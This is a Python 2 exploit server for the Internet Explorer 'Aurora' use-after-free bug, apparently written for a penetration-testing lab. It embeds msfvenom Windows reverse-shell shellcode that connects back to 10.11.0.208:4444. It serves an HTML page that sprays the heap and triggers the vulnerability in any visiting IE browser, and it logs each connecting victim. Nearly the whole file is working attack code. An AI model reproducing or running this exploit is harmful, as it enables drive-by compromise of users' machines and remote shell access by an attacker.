#!/usr/bin/python
#
#   Usage  : python ie_aurora.py [port number]
#   
 
import sys
import socket

from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
        
class RequestHandler(BaseHTTPRequestHandler):

    def convert_to_utf16(self, payload):
        enc_payload = ''
        for i in range(0, len(payload), 2):
            num = 0
            for j in range(0, 2):
                num += (ord(payload[i + j]) & 0xff) << (j * 8)
            enc_payload += '%%u%04x' % num
        return enc_payload
                
    def get_payload(self):
        #payload: msfvenon windows\shell_reverse_tcp encoder:shikata_ga_nai
        #payload is bound to 10.11.0.208:4444
        payload =  ""
        payload += "\xdb\xda\xba\x5f\x27\x98\x42\xd9\x74\x24\xf4\x58\x33"
        payload += "\xc9\xb1\x52\x83\xe8\xfc\x31\x50\x13\x03\x0f\x34\x7a"
        payload += "\xb7\x53\xd2\xf8\x38\xab\x23\x9d\xb1\x4e\x12\x9d\xa6"
        payload += "\x1b\x05\x2d\xac\x49\xaa\xc6\xe0\x79\x39\xaa\x2c\x8e"
        payload += "\x8a\x01\x0b\xa1\x0b\x39\x6f\xa0\x8f\x40\xbc\x02\xb1"
        payload += "\x8a\xb1\x43\xf6\xf7\x38\x11\xaf\x7c\xee\x85\xc4\xc9"
        payload += "\x33\x2e\x96\xdc\x33\xd3\x6f\xde\x12\x42\xfb\xb9\xb4"
        payload += "\x65\x28\xb2\xfc\x7d\x2d\xff\xb7\xf6\x85\x8b\x49\xde"
        payload += "\xd7\x74\xe5\x1f\xd8\x86\xf7\x58\xdf\x78\x82\x90\x23"
        payload += "\x04\x95\x67\x59\xd2\x10\x73\xf9\x91\x83\x5f\xfb\x76"
        payload += "\x55\x14\xf7\x33\x11\x72\x14\xc5\xf6\x09\x20\x4e\xf9"
        payload += "\xdd\xa0\x14\xde\xf9\xe9\xcf\x7f\x58\x54\xa1\x80\xba"
        payload += "\x37\x1e\x25\xb1\xda\x4b\x54\x98\xb2\xb8\x55\x22\x43"
        payload += "\xd7\xee\x51\x71\x78\x45\xfd\x39\xf1\x43\xfa\x3e\x28"
        payload += "\x33\x94\xc0\xd3\x44\xbd\x06\x87\x14\xd5\xaf\xa8\xfe"
        payload += "\x25\x4f\x7d\x50\x75\xff\x2e\x11\x25\xbf\x9e\xf9\x2f"
        payload += "\x30\xc0\x1a\x50\x9a\x69\xb0\xab\x4d\x9c\x4e\xb3\x5d"
        payload += "\xc8\x52\xb3\x4c\x55\xda\x55\x04\x75\x8a\xce\xb1\xec"
        payload += "\x97\x84\x20\xf0\x0d\xe1\x63\x7a\xa2\x16\x2d\x8b\xcf"
        payload += "\x04\xda\x7b\x9a\x76\x4d\x83\x30\x1e\x11\x16\xdf\xde"
        payload += "\x5c\x0b\x48\x89\x09\xfd\x81\x5f\xa4\xa4\x3b\x7d\x35"
        payload += "\x30\x03\xc5\xe2\x81\x8a\xc4\x67\xbd\xa8\xd6\xb1\x3e"
        payload += "\xf5\x82\x6d\x69\xa3\x7c\xc8\xc3\x05\xd6\x82\xb8\xcf"
        payload += "\xbe\x53\xf3\xcf\xb8\x5b\xde\xb9\x24\xed\xb7\xff\x5b"
        payload += "\xc2\x5f\x08\x24\x3e\xc0\xf7\xff\xfa\xf0\xbd\x5d\xaa"
        payload += "\x98\x1b\x34\xee\xc4\x9b\xe3\x2d\xf1\x1f\x01\xce\x06"
        payload += "\x3f\x60\xcb\x43\x87\x99\xa1\xdc\x62\x9d\x16\xdc\xa6"


        return self.convert_to_utf16(payload)
    
    def get_exploit(self):
        exploit = '''
        <html>
        <head>
            <script>
            
            var obj, event_obj;
            
            function spray_heap()
            {
                var chunk_size, payload, nopsled;
            
                chunk_size = 0x80000;
                payload = unescape("<PAYLOAD>");
                nopsled = unescape("<NOP>");
                while (nopsled.length < chunk_size)
                    nopsled += nopsled;
                nopsled_len = chunk_size - (payload.length + 20);        
                nopsled = nopsled.substring(0, nopsled_len);
                heap_chunks = new Array();
                for (var i = 0 ; i < 200 ; i++)
                    heap_chunks[i] = nopsled + payload;
            }
        
            function initialize()
            {
                obj = new Array();
                event_obj = null;
                for (var i = 0; i < 200 ; i++ )
                    obj[i] = document.createElement("COMMENT");
            }
        
            function ev1(evt)
            {
                event_obj = document.createEventObject(evt);
                document.getElementById("sp1").innerHTML = "";
                window.setInterval(ev2, 1);
            }
      
            function ev2()
            {
                var data, tmp;
                
                data = "";
                tmp = unescape("%u0a0a%u0a0a");
                for (var i = 0 ; i < 4 ; i++)
                    data += tmp;
                for (i = 0 ; i < obj.length ; i++ ) {
                    obj[i].data = data;
                }
                event_obj.srcElement;
            }
                    
            function check()
            {
                if (navigator.userAgent.indexOf("MSIE") == -1)
                    return false;
                return true;   
            }
            
            if (check()) {
                initialize();
                spray_heap();               
            }
            else
                window.location = 'about:blank'
                
            </script>
        </head>
        <body>
            <span id="sp1">
            <img src="aurora.gif" onload="ev1(event)">
            </span>        
        </body>
        </html>
        '''
        exploit = exploit.replace('<PAYLOAD>', self.get_payload())
        exploit = exploit.replace('<NOP>', '%u0a0a%u0a0a')
        return exploit 

    def get_image(self):
        content  = '\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff'
        content += '\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44'
        content += '\x01\x00\x3b'
        return content

    def log_request(self, *args, **kwargs):
        pass
        
    def do_GET(self):
        try:
            if self.path == '/':
                print
                print '[-] Incoming connection from %s' % self.client_address[0]
                self.send_response(200) 
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                print '[-] Sending exploit to %s ...' % self.client_address[0]
                self.wfile.write(self.get_exploit())
                print '[-] Exploit sent to %s' % self.client_address[0]
            elif self.path == '/aurora.gif':      
                self.send_response(200)
                self.send_header('Content-Type', 'image/gif')
                self.end_headers()
                self.wfile.write(self.get_image())
        except: 
            print '[*] Error : an error has occured while serving the HTTP request'
            print '[-] Exiting ...'
            sys.exit(-1)
            
                       
def main():
    if len(sys.argv) != 2:
        print 'Usage: %s [port number (between 1024 and 65535)]' % sys.argv[0]
        sys.exit(0)
    try:
        port = int(sys.argv[1])
        if port < 1024 or port > 65535:
            raise ValueError
        try:
            serv = HTTPServer(('', port), RequestHandler)
            ip = socket.gethostbyname(socket.gethostname())
            print '[-] Web server is running at http://%s:%d/' % (ip, port)
            try:
                serv.serve_forever()
            except:
                print '[-] Exiting ...' 
        except socket.error:
            print '[*] Error : a socket error has occurred'
        sys.exit(-1)    
    except ValueError:
        print '[*] Error : an invalid port number was given'
        sys.exit(-1)
            
if __name__ == '__main__':
    main()